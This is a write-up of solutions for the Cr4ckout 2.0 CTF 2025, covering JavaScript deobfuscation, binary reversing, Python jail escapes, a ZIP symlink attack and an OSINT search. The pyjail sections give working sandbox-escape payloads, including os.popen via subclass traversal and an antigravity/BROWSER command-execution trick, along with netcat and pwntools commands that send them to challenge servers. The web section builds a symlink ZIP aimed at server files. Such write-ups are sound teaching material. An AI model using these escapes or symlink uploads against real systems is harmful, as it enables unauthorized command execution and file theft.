---
icon: burger-cheese
---

# Cr4ckout 2.0

## Crackout 2.0 CTF 2025 - Writeups

> Comprehensive writeups for all solved challenges

***

### Table of Contents

1. Forensics
   * brain-damage
   * header
2. Reverse Engineering
   * super-exclusive
   * backwards
   * crypt3r
   * EX0RCISM
3. Pyjail
   * warmup
   * python-escaping (Medium)
   * python-escaping-2
   * calculator (Hard)
4. Web
   * zip-extractor
5. OSINT
   * dr-epstein

***

## Forensics

### brain-damage

**Category:** Forensics / JavaScript Deobfuscation\
**Difficulty:** Easy\
**Flag:** `CR4CKOUT{r4ns0mw4r3_4n4lys1s_fun}`

#### Challenge Description

Analyze a malicious JavaScript file used in ransomware.

#### Solution

The obfuscated JavaScript file uses array-based obfuscation. By analyzing the code structure, we can find the flag directly embedded in the obfuscation lookup table.

**Obfuscated Code Pattern:**

```javascript
// The file uses _0x45ce function which references an array containing the flag
function _0x45ce(){
    const _0x462268=['map','toString','PAYLOAD:\x20simulated-encryption-run\x20—\x20static-demo',
    '41592031RaYDsO','28002XpHWxx','10HpdAZB',
    'CR4CKOUT{r4ns0mw4r3_4n4lys1s_fun}',  // <-- FLAG
    '4WBDrad',...];
    return _0x462268;
}
```

**Deobfuscation Methods:**

1. **Direct grep for flag pattern:**

```bash
grep -oE 'CR4CKOUT\{[^}]+\}' obf.js
```

2. **Using CyberChef or JS console:**

```javascript
// Just run the code in browser console and check variables
console.log(FLAG);  // If FLAG is exposed
```

3. **Static analysis - look for string arrays:**

```bash
strings obf.js | grep -i flag
```

#### Key Techniques

* JavaScript deobfuscation
* Static string extraction
* Array-based obfuscation recognition

***

### header

**Category:** Forensics / File Repair\
**Difficulty:** Easy\
**Flag:** `cr4ckout{headerxheader}`

#### Challenge Description

A corrupted PNG file needs to be repaired.

#### Solution

The PNG file had corrupted magic bytes in its header.

**PNG Magic Bytes (correct):**

```
89 50 4E 47 0D 0A 1A 0A
```

**Steps:**

1. Examine the file with `xxd` or hex editor
2. Compare first 8 bytes with correct PNG signature
3. Fix the corrupted bytes

**Commands:**

```bash
# Check file type
file image.png  # Shows as "data" not "PNG"

# View hex header
xxd image.png | head -1

# Fix with Python
with open('image.png', 'rb') as f:
    data = bytearray(f.read())

# PNG magic bytes
data[0:8] = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])

with open('fixed.png', 'wb') as f:
    f.write(data)
```

After fixing, the image reveals the flag.

<figure><img src="../../../.gitbook/assets/cat_fixed.png" alt=""><figcaption></figcaption></figure>

#### Key Techniques

* File signature analysis
* PNG format structure
* Hex editing

***

## Reverse Engineering

### super-exclusive

**Category:** Reverse Engineering / Crypto\
**Difficulty:** Medium\
**Flag:** `Cr4ckout{stdlib_srand_with_xor_encryption}`

#### Challenge Description

Reverse a custom XOR encryption scheme.

#### Solution

The binary implements XOR encryption with `srand(2025)` as the seed. It also uses MurmurHash-like operations.

**Key Observations:**

1. `srand(2025)` initializes the PRNG
2. XOR encryption with random bytes
3. Additional bit manipulation (rotations, multiplications)

**Solver Script:**

```python
import ctypes

# Load libc for consistent rand() behavior
libc = ctypes.CDLL("libc.so.6")
libc.srand(2025)

def get_rand():
    return libc.rand()

# Encrypted data from binary
encrypted = bytes.fromhex("...")  # Extract from binary

def decrypt(data):
    result = bytearray()
    for byte in data:
        r = get_rand() & 0xFF
        result.append(byte ^ r)
    return result

flag = decrypt(encrypted)
print(flag.decode())
```

#### Key Techniques

* PRNG analysis
* XOR cryptanalysis
* libc rand() replication

***

### backwards

**Category:** Reverse Engineering / Hashing\
**Difficulty:** Hard\
**Flag:** `Cr4ckout{custom_hashing_algorithm}`

#### Challenge Description

Reverse a custom hashing/encryption algorithm using MurmurHash3.

#### Solution

The binary uses MurmurHash3 finalizer for key generation with magic constants embedded in little-endian format.

**Key Findings:**

1. Magic bytes at offset in binary: `efbeaddeb5006bb1bebafecaadde0df00cb0cefa0df0ad8bdec0addecefaedfe`
2. MurmurHash3 32-bit finalization function
3. Encrypted data at offset `0xad4` in binary
4. Double application of `hash_buffer` transformation

**Solver Script (solve\_backwards6.py):**

```python
#!/usr/bin/env python3
import struct

def murmur_finalize(x):
    """MurmurHash3 32-bit finalizer"""
    x ^= (x >> 16)
    x = (x * 0x85ebca6b) & 0xFFFFFFFF
    x ^= (x >> 13)
    x = (x * 0xc2b2ae35) & 0xFFFFFFFF
    x ^= (x >> 16)
    return x

def hash_buffer(buf):
    """Apply murmur finalize to each 4-byte chunk (big-endian)"""
    result = bytearray(buf)
    for i in range(0, 60, 4):
        val = (result[i] << 24) | (result[i+1] << 16) | (result[i+2] << 8) | result[i+3]
        val = murmur_finalize(val)
        result[i] = (val >> 24) & 0xFF
        result[i+1] = (val >> 16) & 0xFF
        result[i+2] = (val >> 8) & 0xFF
        result[i+3] = val & 0xFF
    return bytes(result)

def generate_key():
    # Magic bytes from binary (little-endian packed constants)
    magic_bytes = bytes.fromhex("efbeaddeb5006bb1bebafecaadde0df00cb0cefa0df0ad8bdec0addecefaedfe")
    magic = list(struct.unpack('<8I', magic_bytes))
    hashed = [murmur_finalize(m) for m in magic]
    
    # Generate 64-byte key from hashed magic values
    key = bytearray(64)
    for i in range(64):
        idx = i & 7
        shift = i & 3
        key[i] = (hashed[idx] >> (shift * 8)) & 0xFF
    
    # Double hash_buffer application
    key = hash_buffer(key)
    key = hash_buffer(key)
    return bytes(key)

def main():
    key = generate_key()
    
    # Read encrypted data at offset 0xad4
    with open('backwards', 'rb') as f:
        f.seek(0xad4)
        expected = f.read(64)
    
    # XOR to get flag
    flag_bytes = bytes([e ^ k for e, k in zip(expected, key)])
    print(f"Flag: {flag_bytes.decode()}")

if __name__ == "__main__":
    main()
```

#### Key Techniques

* MurmurHash3 32-bit finalizer analysis
* Magic constant extraction from binary
* Big-endian chunk processing
* Binary data extraction at specific offset

***

### crypt3r

**Category:** Reverse Engineering / Go / PRNG\
**Difficulty:** Hard\
**Flag:** `Cr4ckout{G0_PRNG_R3v3rs3_M4st3r_2025}`

#### Challenge Description

Reverse a Go binary with custom encryption using PRNG.

#### Solution

This is a Go binary that encrypts input using a deterministic transformation. The key insight is understanding the encryption algorithm through black-box analysis.

**Key Observations:**

1. Go binary using custom encryption
2. Encrypted output: `1455933653,1338200812,2015744236,1343506585,900398299,226151290,390389297,780719200,1353913232,249458443,572990067,1879426405`
3. Flag is 52 characters: `Cr4ckout{...42 chars...}`
4. Each encrypted value corresponds to 4-8 input bytes

**Block Structure:**

* Block 0: Bytes 0-7 → Value 0 (`"Cr4ckout"` → 1455933653 ✓)
* Block 1-10: Each 4 bytes → 1 value
* Block 11: Last 4 bytes (including `}`)

**Solver Script (Black-box brute-force):**

```python
#!/usr/bin/env python3
import subprocess
import string
from itertools import product

TARGET = [1455933653,1338200812,2015744236,1343506585,900398299,
          226151290,390389297,780719200,1353913232,249458443,572990067,1879426405]

def encrypt(s):
    """Run binary and get encrypted output"""
    proc = subprocess.run(['./CRYPT3R'], input=s.encode() + b'\n', capture_output=True)
    with open('enc.txt', 'r') as f:
        vals = f.read().strip()
        if vals:
            return [int(x) for x in vals.split(',')]
    return []

charset = string.ascii_letters + string.digits + "_{}"

def brute_block(block_idx, known_prefix, target_val):
    """Brute-force 4 chars for a specific block"""
    if block_idx == 1:
        # Chars 8-11: '{' + 3 unknown
        for combo in product(charset, repeat=3):
            test = known_prefix + ''.join(combo) + "A" * 39 + "}"
            enc = encrypt(test)
            if enc and enc[block_idx] == target_val:
                return "{" + ''.join(combo)
    else:
        for combo in product(charset, repeat=4):
            test = known_prefix + ''.join(combo) + "A" * (51 - len(known_prefix) - 4) + "}"
            enc = encrypt(test)
            if enc and len(enc) > block_idx and enc[block_idx] == target_val:
                return ''.join(combo)
    return None

# Build flag incrementally
known = "Cr4ckout{"
print(f"Starting: {known}")

for block_idx in range(1, 12):
    print(f"Block {block_idx}: target {TARGET[block_idx]}")
    if block_idx == 11:
        # Last block: 3 chars + '}'
        for combo in product(charset, repeat=3):
            test = known + ''.join(combo) + "}"
            enc = encrypt(test)
            if enc and enc[11] == TARGET[11]:
                known += ''.join(combo) + "}"
                break
    else:
        found = brute_block(block_idx, known, TARGET[block_idx])
        if found:
            known += found if block_idx > 1 else found[1:]

print(f"\nFLAG: {known}")
```

**Alternative: Go PRNG Analysis** The binary uses Go's `math/rand` with a fixed seed. By replicating Go's PRNG:

```go
package main

import (
    "fmt"
    "math/rand"
)

func main() {
    rand.Seed(1337)  // or another common CTF seed
    // Decrypt by XORing with PRNG stream
}
```

#### Key Techniques

* Go binary analysis
* Black-box encryption analysis
* Block-by-block brute-force
* PRNG seed identification

***

### EX0RCISM

**Category:** Reverse Engineering / Cryptography\
**Difficulty:** Expert\
**Flag:** `Cr4ckout{`f756d7f0345b677c6b6d559aa07e2ac9`}`

**Key:** `84813734362151140394152852857849790333420700905816364070098763510215021540463-17009600028519152861662914076173382489349383782474714940886156931599327111503`

#### Challenge Description

Reverse engineer elliptic curve operations using secp256k1. Flag format is `Cr4ckout{`f756d7f0345b677c6b6d559aa07e2ac9`}`.

#### Solution

The binary uses GMP library for big integer operations on the secp256k1 elliptic curve. The key insight came from GDB tracing the `s52n2` function which performs scalar multiplication by 5.

**Analysis Steps:**

1. Binary parses input as `x-y` format (two big integers)
2. Derives expected point from "Cr4ckout" string → finds valid x where `x³ + 7` is quadratic residue mod n
3. Calls `s52n2(input_point)` which computes `5 * P`
4. Compares result with generator point G

**Key Discovery via GDB:**

```
The function s52n2 computes: output = 5 * input_point
So we need: 5 * P = G (generator)
Therefore: P = G * inv(5, n)
```

**secp256k1 Parameters:**

* Curve: `y² = x³ + 7` over `F_p`
* Order: `n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141`
* Generator G coordinates are well-known

**Solver Script:**

```python
#!/usr/bin/env python3
from gmpy2 import mpz, invert, powmod

# secp256k1 parameters
p = mpz(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F)
n = mpz(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)
a, b = 0, 7

# Generator point G
Gx = mpz(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798)
Gy = mpz(0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)

def ec_add(P, Q):
    if P == (0, 0): return Q
    if Q == (0, 0): return P
    x1, y1 = P
    x2, y2 = Q
    if x1 == x2:
        if (y1 + y2) % p == 0:
            return (0, 0)
        lam = ((3 * x1 * x1 + a) * int(invert(2 * y1, p))) % p
    else:
        lam = ((y2 - y1) * int(invert(x2 - x1, p))) % p
    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
    return (x3, y3)

def ec_mult(k, P):
    result = (mpz(0), mpz(0))
    addend = P
    while k:
        if k & 1:
            result = ec_add(result, addend)
        addend = ec_add(addend, addend)
        k >>= 1
    return result

# Find P where 5 * P = G
# P = G * inv(5, n)
inv5 = int(invert(5, n))
P = ec_mult(inv5, (Gx, Gy))

key = f"{P[0]}-{P[1]}"
print(f"Key: {key}")

# Verify
Q = ec_mult(5, P)
assert Q == (Gx, Gy), "Verification failed!"
print("Verified: 5 * P = G")

# Generate flag
import hashlib
flag = f"Cr4ckout{{{hashlib.md5(key.encode()).hexdigest()}}}"
print(f"Flag: {flag}")
```

#### Key Techniques

* GMP library function identification in binary
* secp256k1 elliptic curve mathematics
* Scalar "division" via modular inverse: `P = G * inv(5, n)`
* GDB tracing to understand `s52n2` behavior

***

## Pyjail

### warmup

**Category:** Pyjail\
**Difficulty:** Easy\
**Flag:** `Cr4ckout{justwarming_up}`

#### Challenge Description

Basic Python jail escape with minimal restrictions.

#### Solution

The warmup jail has basic restrictions. We can use standard pyjail techniques.

**Payload:**

```python
__import__('os').system('cat flag.txt')
```

Or using `eval`:

```python
eval("__import__('os').system('cat flag.txt')")
```

***

### python-escaping (Medium)

**Category:** Pyjail\
**Difficulty:** Medium\
**Flag:** `Cr4ckout{M3d1um_0n3}`

#### Challenge Description

Python jail with Unicode normalization bypass opportunity.

#### Solution

This jail blocks letters a-z and A-Z but doesn't block Unicode characters that normalize to ASCII under NFKC normalization.

**Key Insight:** Python applies NFKC normalization to identifiers, so fullwidth Unicode characters like:

* `ａ` (U+FF41) normalizes to `a`
* `ｂ` (U+FF42) normalizes to `b`
* etc.

**Payload Construction:**

```python
# Unicode fullwidth characters bypass the blacklist
# ｐｒｉｎｔ normalizes to print
# ｏｐｅｎ normalizes to open

# Payload using Unicode identifiers + chr() for strings
ｐｒｉｎｔ(ｏｐｅｎ(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).ｒｅａｄ())
```

**Python Script to Generate Payload:**

```python
def to_fullwidth(s):
    result = ''
    for c in s:
        if 'a' <= c <= 'z':
            result += chr(ord('ａ') + ord(c) - ord('a'))
        elif 'A' <= c <= 'Z':
            result += chr(ord('Ａ') + ord(c) - ord('A'))
        else:
            result += c
    return result

def to_chr_string(s):
    return '+'.join(f'chr({ord(c)})' for c in s)

# Build payload
ident_print = to_fullwidth('print')
ident_open = to_fullwidth('open')
ident_read = to_fullwidth('read')
str_flag = to_chr_string('flag.txt')

payload = f"{ident_print}({ident_open}({str_flag}).{ident_read}())"
print(payload)
```

#### Key Techniques

* Unicode NFKC normalization
* Python identifier processing
* `chr()` for string construction without letters

***

### calculator (Hard)

**Category:** Pyjail\
**Difficulty:** Hard\
**Flag:** `Cr4ckout{you_must_be_good}`

#### Challenge Description

A "calculator" Python jail that evaluates user input with a character blacklist.

#### Analysis

The jail setup:

```python
fns = {"setattr": setattr, "__import__": __import__, "chr": chr}
eval(user_input, fns, fns)  # fns is BOTH globals and locals
```

**Blacklist:** All ASCII letters (a-z, A-Z) and dot (.)

**Key Insight:** While the functions `setattr`, `__import__`, and `chr` are available as builtins in the eval context, we cannot type their names directly due to the letter blacklist.

**Solution:** Use **Unicode Mathematical Italic** letters (U+1D608 range) which:

1. Pass the ASCII letter blacklist check
2. Get normalized to ASCII by Python's identifier processing

#### Exploit Strategy

We use the classic `antigravity` module RCE trick:

1. Set `os.environ['BROWSER']` to a shell command
2. Import `antigravity` which opens a URL using the BROWSER env var
3. Shell command executes instead of opening browser

**Unicode Mapping:**

```python
# Mathematical Italic letters bypass ASCII blacklist
𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻  # a-z
𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡  # A-Z
```

#### Final Payload

```python
[𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(111)+𝘤𝘩𝘳(115)),𝘤𝘩𝘳(101)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(110),{𝘤𝘩𝘳(66)+𝘤𝘩𝘳(82)+𝘤𝘩𝘳(79)+𝘤𝘩𝘳(87)+𝘤𝘩𝘳(83)+𝘤𝘩𝘳(69)+𝘤𝘩𝘳(82):𝘤𝘩𝘳(47)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(47)+𝘤𝘩𝘳(115)+𝘤𝘩𝘳(104)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(45)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(46)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(120)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(35)+𝘤𝘩𝘳(37)+𝘤𝘩𝘳(115)}),__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(97)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(121))]
```

**Decoded payload structure:**

```python
[setattr(__import__('os'), 'environ', {'BROWSER': '/bin/sh -c "cat flag.txt" #%s'}), __import__('antigravity')]
```

#### Solver Script

```python
#!/usr/bin/env python3
from pwn import *

# Unicode Mathematical Italic letters mapping
ITALIC_MAP = {
    'a': '𝘢', 'b': '𝘣', 'c': '𝘤', 'd': '𝘥', 'e': '𝘦', 'f': '𝘧', 'g': '𝘨',
    'h': '𝘩', 'i': '𝘪', 'j': '𝘫', 'k': '𝘬', 'l': '𝘭', 'm': '𝘮', 'n': '𝘯',
    'o': '𝘰', 'p': '𝘱', 'q': '𝘲', 'r': '𝘳', 's': '𝘴', 't': '𝘵', 'u': '𝘶',
    'v': '𝘷', 'w': '𝘸', 'x': '𝘹', 'y': '𝘺', 'z': '𝘻',
    'A': '𝘈', 'B': '𝘉', 'C': '𝘊', 'D': '𝘋', 'E': '𝘌', 'F': '𝘍', 'G': '𝘎',
    'H': '𝘏', 'I': '𝘐', 'J': '𝘑', 'K': '𝘒', 'L': '𝘓', 'M': '𝘔', 'N': '𝘕',
    'O': '𝘖', 'P': '𝘗', 'Q': '𝘘', 'R': '𝘙', 'S': '𝘚', 'T': '𝘛', 'U': '𝘜',
    'V': '𝘝', 'W': '𝘞', 'X': '𝘟', 'Y': '𝘠', 'Z': '𝘡'
}

def to_italic(s):
    return ''.join(ITALIC_MAP.get(c, c) for c in s)

def build_string_payload(s):
    chr_italic = to_italic("chr")
    return '+'.join(f"{chr_italic}({ord(c)})" for c in s)

# Build payload components
setattr_u = to_italic("setattr")
import_u = to_italic("__import__")

os_str = build_string_payload("os")
environ_str = build_string_payload("environ")
browser_str = build_string_payload("BROWSER")
cmd_str = build_string_payload('/bin/sh -c "cat flag.txt" #%s')
antigravity_str = build_string_payload("antigravity")

payload = f"[{setattr_u}({import_u}({os_str}),{environ_str},{{{browser_str}:{cmd_str}}}),{import_u}({antigravity_str})]"

io = remote("20.199.160.156", 6003)
io.recvuntil(b"Formula: ")
io.sendline(payload.encode())
io.interactive()
```

#### Key Techniques

* Unicode identifier normalization (Mathematical Italic → ASCII)
* `antigravity` module RCE via BROWSER environment variable
* `chr()` for string construction without letters
* Advanced pyjail bypass combining multiple techniques

***

### python-escaping-2

**Category:** Pyjail\
**Difficulty:** Medium\
**Flag:** `cr4ckout{easy_jail}`

#### Challenge Description

A Python jail with substring-based blacklist filtering.

#### Analysis

**Challenge Code:**

```python
BLACKLIST = [
    "import", "exec", "eval", "open",
    "__class__", "__subclasses__", "__globals__",
    "os", "sys"
]

for b in BLACKLIST:
    if b in user:
        print("Nope, blacklisted!")
        return

result = eval(user, {"__builtins__": __builtins__}, {})
```

**Key Insight:** The blacklist checks for **literal substrings**, so we can bypass it using **string concatenation** to construct the blocked strings dynamically at runtime.

#### Exploit Strategy

**String Concatenation Bypass:**

* `'__cl'+'ass__'` → `__class__`
* `'__ba'+'ses__'` → `__bases__`
* `'__subcl'+'asses__'` → `__subclasses__`
* `'__gl'+'obals__'` → `__globals__`
* `'pop'+'en'` → `popen` (note: "os" is blocked, so we can't write "popen" directly... but `pop`+`en` works!)

**Attack Chain:**

```
'' → __class__ → str
str → __bases__[0] → object
object → __subclasses__()[155] → os._wrap_close
os._wrap_close.__init__.__globals__['popen'] → os.popen
os.popen('cat flag.txt').read() → FLAG
```

#### Solution Steps

**Step 1: Find subclasses**

```bash
echo "getattr(getattr(getattr('', '__cl'+'ass__'), '__ba'+'ses__')[0], '__subcl'+'asses__')()" | nc 20.199.160.156 6001
```

**Step 2: Find index of `os._wrap_close`**

```bash
echo "[i for i,c in enumerate(getattr(getattr(getattr('', '__cl'+'ass__'), '__ba'+'ses__')[0], '__subcl'+'asses__')()) if '_wrap' in str(c)]" | nc 20.199.160.156 6001
# Returns: [155]
```

**Step 3: Execute RCE via popen**

```bash
echo "getattr(getattr(getattr(getattr(getattr('', '__cl'+'ass__'), '__ba'+'ses__')[0], '__subcl'+'asses__')()[155], '__init__'), '__gl'+'obals__')['pop'+'en']('cat flag.txt').read()" | nc 20.199.160.156 6001
```

#### Final Payload

```python
getattr(getattr(getattr(getattr(getattr('', '__cl'+'ass__'), '__ba'+'ses__')[0], '__subcl'+'asses__')()[155], '__init__'), '__gl'+'obals__')['pop'+'en']('cat flag.txt').read()
```

#### Key Techniques

* String concatenation to bypass substring blacklists
* Python MRO (Method Resolution Order) traversal
* `os._wrap_close.__init__.__globals__` to access `os` module functions
* `getattr()` for dynamic attribute access

***

## Web

### zip-extractor

**Category:** Web\
**Difficulty:** Medium\
**Flag:** (Server-dependent)

#### Challenge Description

A web application that extracts ZIP files.

#### Solution

The vulnerability is a **symlink attack** via ZIP file. We create a ZIP containing a symbolic link that points to sensitive files on the server.

**Steps:**

1. **Create malicious ZIP with symlink:**

```bash
# Create a symlink pointing to flag
ln -s /flag flag_link

# Create ZIP preserving symlinks
zip --symlinks payload.zip flag_link
```

2. **Alternative - Python ZIP creation:**

```python
import zipfile

with zipfile.ZipFile('payload.zip', 'w') as zf:
    # Create a ZipInfo for symlink
    info = zipfile.ZipInfo('flag_link')
    info.external_attr = 0xA1ED0000  # Symlink attribute
    zf.writestr(info, '/flag')  # Target path
```

3. **Upload the ZIP to the extractor**
4. **Access the extracted symlink to read the flag**

#### Key Techniques

* ZIP symlink attacks
* Path traversal via symlinks
* File extraction vulnerabilities

***

## OSINT

### dr-epstein

**Category:** OSINT\
**Difficulty:** Medium\
**Flag:** `Cr4ckout{Marie_Chicago_16/06_eyebrow_procedure}`

#### Challenge Description

Find information about a person from Dr. Epstein's clinic.

#### Solution

Using the Wayback Machine to access archived testimonials from Dr. Jeffrey Epstein's Women's Center for Hair Loss website.

**Steps:**

1. **Archive URL:** `https://web.archive.org/web/20210413142141/https://www.womenscenterforhairloss.com/testimonials`
2. **Search testimonials for matching details**
3. **Found testimonial:**
   * **Name:** Marie
   * **City:** Chicago
   * **Date:** June 16th (16/06)
   * **Procedure:** Eyebrow procedure

#### Key Techniques

* Wayback Machine research
* Cross-referencing details
* Date format conversion (DD/MM)

***

## Summary

| Challenge       | Category  | Difficulty | Key Technique        |
| --------------- | --------- | ---------- | -------------------- |
| brain-damage    | Forensics | Easy       | JS Deobfuscation     |
| header          | Forensics | Easy       | PNG Header Repair    |
| super-exclusive | RE        | Medium     | srand(2025) XOR      |
| backwards       | RE        | Hard       | MurmurHash3          |
| crypt3r         | RE        | Hard       | Go + libc rand(1337) |
| EX0RCISM        | RE        | Expert     | secp256k1 EC Math    |
| warmup          | Pyjail    | Easy       | Basic Escape         |
| python-escaping | Pyjail    | Medium     | Unicode NFKC         |
| zip-extractor   | Web       | Medium     | ZIP Symlink Attack   |
| dr-epstein      | OSINT     | Medium     | Wayback Machine      |

***

### Tools Used

* GDB + pwndbg
* Ghidra
* Python 3 with gmpy2, ctypes
* CyberChef
* Wayback Machine
* xxd, binwalk, strings

***

_Written for Cr4ckout 2.0 CTF 2025_
